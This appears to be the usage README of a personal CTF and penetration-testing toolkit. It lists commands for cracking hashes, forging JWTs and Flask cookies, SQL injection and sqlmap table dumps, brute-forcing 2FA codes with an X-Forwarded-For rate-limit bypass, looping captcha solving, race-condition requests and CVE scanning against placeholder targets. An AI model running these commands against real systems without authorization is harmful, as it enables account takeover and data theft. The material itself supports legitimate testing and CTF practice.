# Usage

Install first (symlinks all scripts into `~/.local/bin`):

```bash
./install.sh
```

If `~/.local/bin` isn't already on PATH, the installer prints the one line to add to your shell rc. After that, scripts are callable by short name (`cipher-id`, `jwt`, `sqli-smoketest`, etc.) from anywhere.

Short-name → script mapping is just the filename without `.py` / `.sh`.

---

## By task

### "Here's a weird string, what is it?"

```bash
cipher-id --try '48656c6c6f20776f726c64'                 # hex → "Hello world"
cipher-id --chain 'VTBkV2MySkhPR2RXTWpsNVlrZFJQUT09'     # peel wrapped base64
echo 'YmFzZTY0' | cipher-id -                            # from stdin
```

Known-cipher mode (skip detection):
```bash
cipher-id --cipher vigenere --key LEMON 'LXFOPVEFRNHR'   # ATTACKATDAWN
cipher-id --cipher playfair --key MONARCHY '<ciphertext>'
cipher-id --cipher xor-single '1b37373331363f78...'      # brute single-byte
cipher-id --cipher xor-repeating '<hex>'                 # brute key-length 2..20
cipher-id --list                                         # every cipher it knows
```

### "I have a hash"

```bash
hash-id '0192023a7bbd73250516f069df18b500'               # MD5/NTLM candidates
hash-id "$(cat hashes.txt)"                              # or paste
# Then crack:
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
```

### "AES/ChaCha20 ciphertext + key + IV"

```bash
# AES-CBC with PKCS#7
sym-crypt dec aes-cbc --key-hex 00112233... --iv-hex deadbeef... \
    --data-b64 'AAAA...' --pkcs7 --out-utf8

# AES-GCM (tag at end)
sym-crypt dec aes-gcm --key-hex ... --iv-hex ... \
    --data-hex <body> --tag-hex <16byte_tag> --out-utf8

# AES-CTR (nonce is initial counter block)
sym-crypt dec aes-ctr --key-hex ... --iv-hex ... --data-hex ... --out-utf8

# ChaCha20-Poly1305
sym-crypt dec chacha20-poly1305 --key-hex ... --nonce-hex ... \
    --data-hex ... --tag-hex ... --out-utf8

sym-crypt --list                                         # every supported mode
```

### "I need to attack a JWT"

```bash
jwt decode 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYm9iIn0.sig'
jwt none   '<token>'                                     # forge alg=none
jwt edit   '<token>' '{"role":"admin"}'                  # change a claim
jwt sign   '<token>' 'secretkey' HS256                   # resign with HMAC
jwt crack  '<token>' /usr/share/wordlists/rockyou.txt    # brute HMAC secret
```

### "Is this param SQL-injectable?"

```bash
sqli-smoketest 'http://target/rest/products/search?q=FUZZ'
# fires 15+ probes, flags DIFF / [sql-err] / [slow] rows
```

Then if you see leaks, follow up with sqlmap:
```bash
sqlmap -u 'http://target/rest/products/search?q=1' --batch --dbs
sqlmap -r request.txt --batch --dump -T Users
```

### "I need to replay a Burp request"

Save the raw request (right-click in Burp → Copy to file). Then:
```bash
replay request.txt
replay request.txt https://alternate-host     # same path, different base
```

### "2FA endpoint — is it rate-limited?"

```bash
otp-bruteforce --url 'http://target/2fa' \
    --method POST --data '{"email":"u@u","otp":CODE}' \
    --match-success '"ok":true' --digits 6
# or rotate X-Forwarded-For to bypass IP-based limits:
otp-bruteforce --url 'http://target/2fa' \
    --header 'X-Forwarded-For: 10.0.0.CODE' \
    --match-fail 'rate limit' --digits 4
```

TOTP generation (if the secret leaked):
```bash
totp now JBSWY3DPEHPK3PXP                                # current 6-digit code
totp window JBSWY3DPEHPK3PXP 5                           # ± 5 steps
totp uri 'otpauth://totp/foo?secret=JBSWY3DPEHPK3PXP'
```

### "Math captcha on every request"

```bash
captcha-math 'What is 7 + 5?'                            # 12
captcha-math --words 'twelve minus three'                # 9
# Loop it:
while :; do
    q=$(curl -s target/captcha)
    a=$(captcha-math "$q")
    curl -s target/submit -d "answer=$a"
done
```

### "I have a mystery file"

```bash
magic-bytes thing                                        # identify by header
magic-bytes thing --scan                                 # find ALL embedded signatures
stego-triage thing /usr/share/wordlists/rockyou.txt      # throw everything at it
```

### "Here's a pcap"

```bash
pcap-triage capture.pcap
# produces an out-dir with: HTTP objects, DNS queries, cleartext creds, USB capdata
usb-keystrokes out/usb-capdata.txt                       # if USB HID present
```

### "Someone exfilled via XOR"

```bash
# Single-byte XOR (classic cryptopals challenge 3):
cipher-id --cipher xor-single '<hex-of-ciphertext>'

# Repeating-key XOR (classic challenge 6):
cipher-id --cipher xor-repeating '<hex-of-ciphertext>'

# Known key:
cipher-id --cipher xor --key SECRET '<hex-or-raw>'
```

Or the dedicated tool with more control:
```bash
xor-crack single '<hex>'
xor-crack keylen '<hex>' 40
xor-crack repeat '<hex>' 7
```

### "RSA ciphertext"

```bash
rsa-attack --n <N> --e <e> --c <ciphertext>
rsa-attack --pubkey key.pem --c <ciphertext>
rsa-attack --n <N1> --e <e> --c <c> --n2 <N2>            # common factor between two keys
```

For heavier attacks, fall through to RsaCtfTool:
```bash
RsaCtfTool --publickey key.pem --uncipherfile ciphertext.bin
```

### "Classical cipher without a key"

```bash
caesar 'Uryyb Jbeyq'                                     # all 26 shifts
caesar --rot47 '!$%&(uryyb'
```

Or let cipher-id brute Caesar + Affine + Rail-fence in one go:
```bash
cipher-id --try --only caesar,affine,railfence 'ciphertext'
```

### "I need a flag in an image"

```bash
stego-triage mystery.png
# Also eyeball with ImageMagick (see cheatsheets/imagemagick.md):
convert mystery.png -separate ch_%d.png                  # per-channel
convert mystery.png -evaluate And 1 -evaluate Multiply 255 lsb.png
zbarimg mystery.png                                      # QR / barcode
```

### "Flask app with signed cookie"

```bash
flask-cookie decode 'eyJ1c2VyIjoiYm9iIn0.XYZ.sig'
flask-cookie crack  'eyJ1c2VyIjoiYm9iIn0.XYZ.sig' /usr/share/wordlists/rockyou.txt
flask-cookie forge  '{"user":"admin"}' 'cracked-secret'
```

### "URL / HTML / base-N encoding"

```bash
urlcode url enc "test' OR 1=1--"                         # URL-encode
urlcode urlall "pwned"                                   # URL-encode EVERY byte (WAF bypass)
urlcode b64 dec 'SGVsbG8='                               # base64 decode
urlcode chain b64,hex,url 'raw text'                     # chain multiple encodings
urlcode rot 13 'hello'
```

### "Race condition — can I buy an item twice?"

```bash
race-fire 20 -- -X POST 'http://target/buy' -b 'session=...' -d 'id=1'
# fires 20 parallel curls; reports per-request status/time
```

### "OSINT — recon this username"

```bash
osint-handle srpbp                                       # probes 20+ sites
```

### "Enumerate a web target"

```bash
enum-web https://target /usr/share/wordlists/dirb/common.txt
# dumps: headers, robots, sensitive paths, ffuf results, katana crawl, subfinder
```

### "What's actually installed on this box?"

```bash
check-approved                                           # all categories
check-approved web                                       # one category
check-approved crypto
```

---

## Pipeline tricks

Everything reads stdin where it makes sense, so you can chain:

```bash
# fetch, decode, re-decode
curl -s target/data | cipher-id --chain -

# JWT from a header file → inspect
grep -oE '[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' resp.txt | head -1 | jwt decode -

# hex dump a captured message → identify
xxd -p -c 1000 msg.bin | cipher-id --try -
```

## Scripts that need external tools

| Script | External tools |
| --- | --- |
| `sym-crypt` | `cryptography` (`pip install cryptography` once) |
| `stego-triage` | binwalk, exiftool, zsteg, steghide/stegseek, foremost, pngcheck, outguess, multimon-ng |
| `pcap-triage` | tshark, capinfos, foremost |
| `enum-web` | curl, ffuf, katana, subfinder |
| `sqli-smoketest` | curl, python3 |
| `race-fire` | curl |
| `check-approved` | just invokes `which` on every tool |

`check-approved` tells you exactly what's missing on the current host.

## When something doesn't work

- `--help` works on every script.
- Stdlib scripts (`cipher-id`, `jwt`, `urlcode`, `hash-id`, `caesar`, `xor-crack`, `rsa-attack`, `magic-bytes`, `usb-keystrokes`, `captcha-math`, `totp`, `otp-bruteforce`, `flask-cookie`) have zero dependencies — if they fail, it's a bug or malformed input.
- For keyed ciphers, add `--try` to see what each candidate decodes to and whether English scores look sensible.
- If `cipher-id` doesn't identify something, try `--chain` — a layer of base64 often hides the real cipher.

---

## Full script reference

Every script accepts `--help` (or shows usage when run without args). Below is a quick synopsis of each.

### `cipher-id` — identify + decode ~35 ciphers (stdlib)

```
cipher-id '<ct>'                               # list candidates with confidence
cipher-id --try '<ct>'                         # also decode each candidate
cipher-id --chain '<ct>'                       # recursively peel wrappers
cipher-id --only base64,hex '<ct>'             # restrict candidates
cipher-id --cipher vigenere --key LEMON '<ct>' # force a specific decoder
cipher-id --cipher xor-single '<hex|raw>'      # brute single-byte XOR
cipher-id --cipher xor-repeating '<hex>'       # brute repeating-key XOR
cipher-id --list                               # every cipher it knows
```

Keyed ciphers: `vigenere`, `gronsfeld`, `beaufort`, `autokey`, `playfair`, `columnar`, `xor`.
Bruteforce: `xor-single`, `xor-repeating`.

### `sym-crypt` — symmetric cipher enc/dec with key + IV (needs `cryptography`)

```
sym-crypt enc|dec <mode> --key-hex ... --iv-hex ... --data-hex ... [--pkcs7] [--out-utf8|--out-b64]
sym-crypt dec aes-gcm   --key-hex ... --iv-hex ... --data-hex ... --tag-hex ... [--aad-hex ...]
sym-crypt dec chacha20-poly1305 --key-hex ... --nonce-hex ... --data-hex ... --tag-hex ...
sym-crypt --list
```

Modes: `aes-ecb`, `aes-cbc`, `aes-cfb`, `aes-ofb`, `aes-ctr`, `aes-gcm`, `3des-ecb`, `3des-cbc`, `chacha20`, `chacha20-poly1305`, `blowfish-ecb`, `blowfish-cbc`. Every input flag has `--<name>` (utf-8), `--<name>-hex`, `--<name>-b64` variants.

### `jwt` — decode / forge / crack JWTs (stdlib)

```
jwt decode <token>
jwt none   <token>                 # forge alg=none
jwt sign   <token> <secret> [alg]  # HS256/384/512
jwt crack  <token> <wordlist>
jwt edit   <token> '<json-patch>'  # merge keys into payload
```

### `hash-id` — guess hash type by length + charset (stdlib)

```
hash-id '<hash>'
echo '<hash>' | hash-id -
```

### `urlcode` — URL/HTML/base64/hex/rot codec (stdlib)

```
urlcode url     enc|dec [data]
urlcode urlall  enc     [data]          # URL-encode EVERY byte (WAF bypass)
urlcode html    enc|dec [data]
urlcode b64     enc|dec [data]
urlcode b64url  enc|dec [data]
urlcode hex     enc|dec [data]
urlcode rot     <n>     [data]
urlcode chain   <steps> [data]          # e.g. "b64,hex,url"
```

### `caesar` — all 26 shifts (+ ROT47) (stdlib)

```
caesar 'Uryyb Jbeyq'
echo 'Uryyb Jbeyq' | caesar -
caesar --rot47 '!$%&(uryyb'
```

### `xor-crack` — single-byte + repeating-key XOR via frequency (stdlib)

```
xor-crack single      <hex>              # brute 256 keys
xor-crack single-file <path>
xor-crack keylen      <hex> [max=40]     # hamming/IC to guess length
xor-crack repeat      <hex> <keylen>     # extract repeating key
```

### `rsa-attack` — CTF-classic RSA weaknesses (stdlib)

```
rsa-attack --n <N> --e <e> --c <ciphertext>
rsa-attack --pubkey key.pem --c <ciphertext>
rsa-attack --n <N1> --e <e> --c <c> --n2 <N2>   # common-factor between keys
```

Attacks tried in order: e=3 cube root, Fermat, factordb (needs network), Wiener, common factor.

### `magic-bytes` — identify file by signature (stdlib)

```
magic-bytes <path>
magic-bytes <path> --scan              # find ALL embedded signatures
```

### `flask-cookie` — decode/crack/forge Flask session cookies (stdlib)

```
flask-cookie decode '<cookie>'
flask-cookie crack  '<cookie>' <wordlist>
flask-cookie forge  '<json>' '<secret>'
```

### `captcha-math` — solve text/number math captchas (stdlib)

```
captcha-math 'What is 7 + 5?'          # -> 12
captcha-math --words 'twelve minus three'
echo "2 + 3" | captcha-math -
```

### `totp` — generate TOTP codes when the secret has leaked (stdlib)

```
totp now      <base32-secret>
totp window   <base32-secret> [n=5]
totp uri      'otpauth://totp/foo?secret=...'
totp validate <secret> <code>
```

### `otp-bruteforce` — probe 2FA endpoints for weak rate-limiting (stdlib)

```
otp-bruteforce --url 'http://target/2fa?otp=CODE' --digits 6 \
    --match-success '"ok":true'

otp-bruteforce --url 'http://target/2fa' --method POST \
    --data '{"otp":CODE}' --header 'X-Forwarded-For: 10.0.0.CODE' \
    --match-fail 'rate limit'
```

Flags: `--url`, `--method`, `--data`, `--header` (repeatable), `--digits`, `--start`, `--end`, `--parallel`, `--timeout`, `--match-success`, `--match-fail`, `--delay`.

### `usb-keystrokes` — decode USB HID keyboard capture (stdlib)

```
tshark -r cap.pcap -Y 'usb.capdata' -T fields -e usb.capdata > caps.txt
usb-keystrokes caps.txt
```

### `sqli-smoketest` — fire 15+ SQLi probes at a URL (curl)

```
sqli-smoketest 'http://target/path?q=FUZZ'
```

Replace injection point with the literal `FUZZ`. Prints DIFF / `[sql-err]` / `[slow]` markers.

### `replay` — replay a raw HTTP request from file (curl)

```
replay request.txt                      # as-is
replay request.txt https://new-host     # swap base URL
```

Request file is Burp-style raw (request line + headers + blank + body).

### `enum-web` — opinionated web recon (ffuf, katana, subfinder, curl)

```
enum-web https://target [wordlist]
```

Dumps headers / robots / sensitive paths / ffuf dirs / katana crawl / subfinder subs into `enum-<target>/`.

### `race-fire` — fire N parallel curls to probe races (curl)

```
race-fire 20 -- -X POST 'http://target/buy' -b 'session=...' -d 'id=1'
```

### `stego-triage` — throw every stego/forensic tool at a file

```
stego-triage mystery.png
stego-triage mystery.jpg /usr/share/wordlists/rockyou.txt   # for stegseek
```

Produces `stego-<file>-out/` with outputs you can grep for a flag.

### `pcap-triage` — fast pcap overview + extractions (tshark, capinfos, foremost)

```
pcap-triage capture.pcap
```

Produces `pcap-<name>-out/` with: DNS queries, HTTP URIs + objects, cleartext credentials, USB capdata.

### `osint-handle` — probe common sites for a username (curl)

```
osint-handle srpbp
```

### `check-approved` — verify installed tool coverage

```
check-approved                 # all categories
check-approved web             # one category: web|crypto|forensic|network|stego|reversing|misc
```

Reports present/missing per CLI.

### `stego-whitespace` — decode whitespace stego from text (stdlib)

```
stego-whitespace <path>                       # try snow / binary / count schemes
stego-whitespace <path> --scheme snow         # force a scheme
stego-whitespace <path> --inline              # also look at spaces/tabs BETWEEN words
stego-whitespace <path> -o out.bin            # write best-scoring candidate
```

Compatible with `stegsnow -C` output (trailing-space/tab bit encoding).

### `stego-zerowidth` — decode zero-width Unicode stego (stdlib)

```
stego-zerowidth <path>                        # auto: histogram + try both 0/1 orderings + base4 + tag
stego-zerowidth <path> --scheme binary --zero U+200B --one U+200C
stego-zerowidth <path> --scheme base4         # ZWSP=0 ZWNJ=1 ZWJ=2 WJ/BOM=3
stego-zerowidth <path> --scheme tag           # U+E0020..U+E007E tag chars → ASCII
```

Covers ZWSP (U+200B), ZWNJ (U+200C), ZWJ (U+200D), WJ (U+2060), BOM/ZWNBSP (U+FEFF), variation selectors (U+FE00-FE0F), and Unicode tag characters.

### `stego-nullcipher` — acrostic / Nth-letter extractors (stdlib)

```
stego-nullcipher <path>                       # try 1st/2nd/3rd/last letter of word & line, word-length chain
stego-nullcipher <path> --n 2                 # Nth letter per word (negative = from end)
stego-nullcipher <path> --skip 3              # take every 3rd word's first letter
```

### `stego-wav` — WAV LSB extraction (stdlib `wave`)

```
stego-wav <path.wav>                          # try 1, 2, 3, 4 LSBs per sample
stego-wav <path.wav> --bits 2                 # force N LSBs
stego-wav <path.wav> --channel 0              # specific channel on stereo
stego-wav <path.wav> -o out.bin               # write decoded bytes
```

### `image-stego` — one-shot image analysis (ImageMagick + friends)

```
image-stego <image> [outdir]
```

Runs these in order into an output directory you can eyeball:
1. `identify -verbose` + `exiftool` — metadata
2. `strings -n 8` — embedded ASCII
3. `convert -separate` — split R/G/B/A channels
4. LSB visualisation at 1/2/3/4 bits
5. Bit planes 0..7 of the red channel
6. `-negate` and `-auto-level` — reveal faint content
7. Alpha extract (if present)
8. `zbarimg` — QR/barcode (also on a thresholded version)
9. `binwalk --extract` — carve appended files
10. `zsteg -a` — PNG/BMP LSB stego

After it finishes:
```bash
open image-<name>-out/              # macOS — eyeball every PNG
grep -R flag image-<name>-out/      # fast literal-flag scan
```

Required tools: `convert` (ImageMagick), `strings`, `exiftool`. Optional: `zbarimg`, `binwalk`, `zsteg`.

### `cve-scan` — service + web CVE / exploit lookup (nmap + searchsploit)

```
cve-scan <host|ip>                     # TCP service scan + CVE lookup
cve-scan https://target.example        # web fingerprint + CVE lookup (auto-detects URL vs IP)
cve-scan --fast 10.0.0.5               # top-100 ports only
cve-scan --full 10.0.0.5               # all 65535 ports (slow)
cve-scan --search 'apache 2.4.49'      # skip discovery, just query searchsploit
cve-scan --nmap-only 10.0.0.5          # NSE vuln scripts, no searchsploit
```

Chains:
- `nmap -sV --script "default,vuln,safe"` → services + CVE IDs from vuln NSE scripts
- `curl -I` + body sniff for web mode → Server / X-Powered-By / `<meta generator>`
- `searchsploit <service> <version>` per discovered service → offline Exploit-DB matches

Produces a dated output directory with:
```
nmap.nmap  nmap.xml                   # full nmap output
services.txt                          # extracted "80/tcp open http Apache 2.4.49" lines
cves.txt                              # unique CVE IDs seen in NSE output
searchsploit-<service>.txt            # one file per matched service
sensitive.txt                         # (web mode) non-404 paths from quick probe
```

Requires: `nmap`. Optional: `searchsploit` (apt install exploitdb), `curl`.

Only use against systems you're explicitly authorized to test.
